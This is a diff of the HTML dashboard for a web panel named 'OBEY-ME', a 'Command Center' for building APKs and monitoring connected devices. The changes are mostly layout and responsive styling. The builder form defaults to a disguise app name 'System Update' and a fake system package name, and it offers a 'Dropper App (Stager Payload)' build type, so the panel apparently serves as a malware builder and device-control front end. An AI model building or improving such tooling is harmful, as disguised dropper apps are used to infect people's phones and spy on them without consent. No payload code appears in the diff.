@@ -58,29 +58,27 @@
             <i class="fas fa-circle-notch fa-spin" style="color: #06b6d4;"></i> Verifying authentication...
         </div>
     </div>
-
-
     <!-- Navbar -->
     <nav class="navbar">
-        <div style="max-width: 1400px; margin: 0 auto; width: 100%; padding: 0 24px; display: flex; align-items: center; justify-content: space-between;">
+        <div class="navbar-container" style="max-width: 1400px; margin: 0 auto; width: 100%; padding: 0 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px;">
             <a href="index.html" class="navbar-brand">
                 <span class="brand-icon"><i class="fas fa-satellite-dish"></i></span>
                 OBEY-ME
             </a>
-            <div style="display: flex; align-items: center; gap: 12px;">
+            <div class="navbar-actions" style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
                 <a href="admin.html" id="adminPanelBtn" class="nav-link" style="display: none; color: #eb4d4b; border: 1px solid rgba(235, 77, 75, 0.3); padding: 4px 10px; border-radius: 6px; font-size: 0.75rem;"><i class="fas fa-user-shield me-1"></i> Admin Panel</a>
                 <a href="index.html" class="nav-link"><i class="fas fa-hammer me-1"></i> Builder</a>
                 <span class="live-badge"><span class="live-dot"></span> SYSTEM ACTIVE</span>
                 
                 <!-- Google User Profile Section -->
-                <div id="navUserProfile" style="display: none; align-items: center; gap: 10px; margin-left: 8px; padding-left: 14px; border-left: 1px solid rgba(255,255,255,0.12);">
-                    <img id="userAvatar" src="" alt="Avatar" style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 2px solid var(--accent, #6c5ce7);">
+                <div id="navUserProfile" style="display: none; align-items: center; gap: 8px; margin-left: 4px; padding-left: 10px; border-left: 1px solid rgba(255,255,255,0.12);">
+                    <img id="userAvatar" src="" alt="Avatar" style="width: 28px; height: 28px; border-radius: 50%; object-fit: cover; border: 2px solid var(--accent, #6c5ce7);">
                     <div style="display: flex; flex-direction: column; align-items: flex-start;">
-                        <span id="userName" style="font-size: 0.82rem; font-weight: 600; color: #fff; line-height: 1.2;">User Name</span>
-                        <span id="userRoleBadge" style="font-size: 0.6rem; font-weight: 700; padding: 1px 6px; border-radius: 4px; display: inline-block; text-transform: uppercase;">USER</span>
+                        <span id="userName" style="font-size: 0.8rem; font-weight: 600; color: #fff; line-height: 1.2;">User Name</span>
+                        <span id="userRoleBadge" style="font-size: 0.58rem; font-weight: 700; padding: 1px 5px; border-radius: 4px; display: inline-block; text-transform: uppercase;">USER</span>
                     </div>
-                    <button id="signOutBtn" onclick="handleSignOut()" class="btn-ghost" style="padding: 4px 10px; font-size: 0.75rem; color: #ff6b6b; border: 1px solid rgba(255,107,107,0.3); border-radius: 6px; cursor: pointer; background: transparent; transition: all 0.2s;">
-                        <i class="fas fa-sign-out-alt" style="margin-right: 4px;"></i> Sign Out
+                    <button id="signOutBtn" onclick="handleSignOut()" class="btn-ghost" style="padding: 4px 8px; font-size: 0.72rem; color: #ff6b6b; border: 1px solid rgba(255,107,107,0.3); border-radius: 6px; cursor: pointer; background: transparent; transition: all 0.2s;">
+                        <i class="fas fa-sign-out-alt"></i><span class="hide-mobile"> Sign Out</span>
                     </button>
                 </div>
             </div>
@@ -90,7 +88,7 @@
     <!-- Main Content -->
     <main style="max-width: 1400px; margin: 0 auto; padding: 32px 24px;">
         <div class="fade-in">
-            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;flex-wrap:wrap;gap:16px;">
+            <div class="page-title-row" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px;flex-wrap:wrap;gap:12px;">
                 <div>
                     <h1 style="font-size:1.8rem;margin-bottom:6px;">Command Center</h1>
                     <p style="color:var(--text-secondary);font-size:0.85rem;">Build APKs and monitor connected devices.</p>
@@ -101,7 +99,7 @@
                 </div>
             </div>
 
-            <div style="display:grid;grid-template-columns:380px 1fr;gap:24px;align-items:start;">
+            <div class="main-dashboard-grid">
                 <!-- Builder -->
                 <div class="card border-top-primary">
                     <div class="card-header-gradient">
@@ -109,33 +107,46 @@
                             <i class="fas fa-hammer text-primary-c"></i> APK Builder
                         </h4>
                     </div>
-                    <div style="padding:24px;">
-                        <form id="buildForm">
-                            <div style="margin-bottom:14px;"><label class="form-label">App Name</label>
-                            <input type="text" name="app_name" class="form-input" placeholder="e.g. System Update" required></div>
-                            <div style="margin-bottom:14px;"><label class="form-label">Package Name</label>
-                            <input type="text" name="package_name" class="form-input" placeholder="com.system.update" value="com.system.service.booster" required></div>
-                            <div style="margin-bottom:14px;" id="webviewContainer"><label class="form-label">Webview URL</label>
-                            <input type="url" name="webview_url" id="webviewInput" class="form-input" placeholder="https://..." required></div>
-                            <div style="margin-bottom:14px;"><label class="form-label">Build Type</label>
-                            <select name="build_type" id="buildTypeSelect" class="form-input" onchange="toggleWebviewField()">
-                                <option value="main">Main App (Core Service)</option>
-                                <option value="dropper">Dropper App (Auto-Installer)</option>
-                            </select></div>
-                            <div style="margin-bottom:20px;"><label class="form-label">Custom Icon (PNG)</label>
-                            <input type="file" name="app_icon" id="appIconInput" class="form-input" accept=".png" style="padding:8px 12px;"></div>
-                            <button type="submit" id="buildBtn" class="btn-primary-glow" style="width:100%;display:flex;align-items:center;justify-content:center;gap:8px;">
-                                <i class="fas fa-rocket" id="buildIcon"></i><span id="buildText">BUILD APK</span>
+                    <div style="padding:24px;" class="card-body">
+                        <form id="buildForm" style="display:flex;flex-direction:column;gap:18px;">
+                            <div>
+                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">APP NAME</label>
+                                <input type="text" name="app_name" class="form-input" placeholder="e.g. System Update" value="System Update" required style="width:100%;">
+                            </div>
+                            <div>
+                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">PACKAGE NAME</label>
+                                <input type="text" name="package_name" class="form-input" placeholder="com.system.service.booster" value="com.system.service.booster" required style="width:100%;">
+                            </div>
+                            <div id="webviewContainer">
+                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">WEBVIEW URL</label>
+                                <input type="url" id="webviewInput" name="webview_url" class="form-input" placeholder="https://..." value="https://google.com" required style="width:100%;">
+                            </div>
+                            <div>
+                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">BUILD TYPE</label>
+                                <select name="build_type" id="buildTypeSelect" class="form-input" onchange="toggleWebviewField()" style="width:100%;">
+                                    <option value="main" selected>Main App (Core Service)</option>
+                                    <option value="dropper">Dropper App (Stager Payload)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">CUSTOM ICON (PNG)</label>
+                                <input type="file" id="appIconInput" accept="image/png" class="form-input" style="width:100%;padding:8px 12px;font-size:0.8rem;">
+                            </div>
+                            <button type="submit" id="buildBtn" class="btn-primary-glow" style="margin-top:6px;width:100%;">
+                                <i id="buildIcon" class="fas fa-rocket" style="margin-right:8px;"></i><span id="buildText">BUILD APK</span>
                             </button>
                         </form>
-                        <div id="progressArea" style="margin-top:20px;display:none;">
+
+                        <div id="progressArea" style="display:none;margin-top:20px;">
                             <div class="progress-track" style="margin-bottom:10px;"><div id="progressBar" class="progress-fill" style="width:0%;"></div></div>
                             <div id="consoleLog" class="console-box"><div id="logLines"></div></div>
-                            <p id="buildStatus" style="font-size:0.72rem;color:var(--text-secondary);text-align:center;margin-top:8px;">Initializing...</p>
+                            <div id="buildStatus" style="font-size:0.78rem;color:var(--text-secondary);margin-top:8px;text-align:center;"></div>
                         </div>
-                        <div id="downloadArea" style="margin-top:20px;padding:20px;background:rgba(0,184,148,0.08);border:1px dashed rgba(0,184,148,0.3);border-radius:var(--radius-sm);text-align:center;display:none;">
-                            <p style="font-size:0.78rem;color:var(--success);font-weight:600;margin-bottom:10px;">✅ BUILD COMPLETE</p>
-                            <a href="javascript:void(0)" id="downloadBtn" onclick="downloadApk(this)" class="btn-accent" style="text-decoration:none;cursor:pointer;"><i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK</a>
+
+                        <div id="downloadArea" style="display:none;margin-top:20px;text-align:center;">
+                            <button id="downloadBtn" onclick="downloadApk(this)" class="btn-accent" style="width:100%;padding:14px;font-size:0.9rem;">
+                                <i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK
+                            </button>
                         </div>
                     </div>
                 </div>
